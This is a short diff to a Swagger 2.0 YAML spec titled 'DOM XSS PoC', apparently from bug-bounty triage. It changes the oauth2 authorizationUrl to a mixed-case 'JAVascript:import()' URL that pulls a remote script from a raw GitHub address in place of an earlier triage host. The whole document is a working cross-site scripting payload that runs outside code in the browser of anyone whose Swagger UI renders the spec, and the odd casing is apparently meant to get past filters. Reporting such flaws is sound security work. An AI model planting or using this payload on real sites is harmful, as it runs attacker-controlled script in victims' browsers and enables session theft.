@@ -2,7 +2,7 @@ swagger: '2.0'
 securityDefinitions:
   a:
     type: oauth2
-    authorizationUrl: JAVascript:import('https://triagedomain/tableaupoc.js')//
+    authorizationUrl: JAVascript:import('https://raw.githubusercontent.com/bbtest-123/poctriage/main/script.js')//
 info:
   version: "0.0.1"
   title: DOM XSS PoC
